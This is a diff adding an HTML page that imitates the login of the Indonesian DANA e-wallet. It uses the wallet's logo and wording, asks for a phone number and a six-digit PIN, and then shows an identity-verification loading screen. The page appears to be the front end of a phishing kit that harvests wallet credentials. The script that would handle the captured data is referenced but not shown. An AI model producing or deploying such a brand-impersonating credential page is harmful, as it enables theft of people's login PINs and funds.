@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>DANA</title>
+  <link rel="stylesheet" href="style.css" />
+  <script src="script.js" defer></script>
+  <style>
+    body, html { margin: 0; padding: 0; height: 100%; }
+    .page { display: none; height: 100%; }
+    .active { display: flex; flex-direction: column; align-items: center; justify-content: space-between; }
+  </style>
+</head>
+<body>
+
+<!-- Login Page -->
+<div id="loginPage" class="page active">
+  <div class="container container-top">
+    <img src="assets/logo-login-dana.png" alt="DANA Logo" class="logo" />
+    <p class="title">Masukkan <strong>nomor HP</strong> kamu untuk lanjut</p>
+
+    <div class="phone-input">
+      <div class="country-code">
+        <img src="https://flagcdn.com/w40/id.png" alt="ID Flag" />
+        <span>+62</span>
+      </div>
+      <input id="phoneNumber" type="text" placeholder="811-1234-5678" inputmode="numeric" maxlength="13" />
+    </div>
+
+    <p class="note">
+      Nomor ponsel akan digunakan sebagai ID kamu &<br />
+      menjaga akun selalu aman. Dengan melanjutkan,<br />
+      kamu setuju dengan <span class="bold">Syarat & Ketentuan</span> dan<br />
+      <span class="bold">Kebijakan Privasi</span> kami.
+    </p>
+  </div>
+
+  <!-- Sticky button -->
+  <div class="bottom-button">
+    <button class="btn-lanjut">LANJUT</button>
+  </div>
+</div>
+
+<!-- PIN Page -->
+<div id="pinPage" class="page">
+  <div class="container">
+    <img src="assets/logo-login-dana.png" alt="DANA Logo" class="logo" />
+    <p class="title">Masukkan <strong>PIN DANA</strong></p>
+
+    <div class="pin-input">
+      <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+    </div>
+
+    <button id="toggle-pin">TAMPILKAN</button>
+    <p class="forgot">LUPA PIN?</p>
+  </div>
+</div>
+
+<!-- Loading Page -->
+<div id="loadingPage" class="page">
+  <div class="container loading-center">
+    <video autoplay muted loop playsinline class="video-animasi">
+      <source src="assets/loading-dana.mp4" type="video/mp4" />
+      Browser Anda tidak mendukung video.
+    </video>
+    <p class="loading-text">Memverifikasi identitasmu...</p>
+  </div>
+</div>
+
+</body>
+</html>
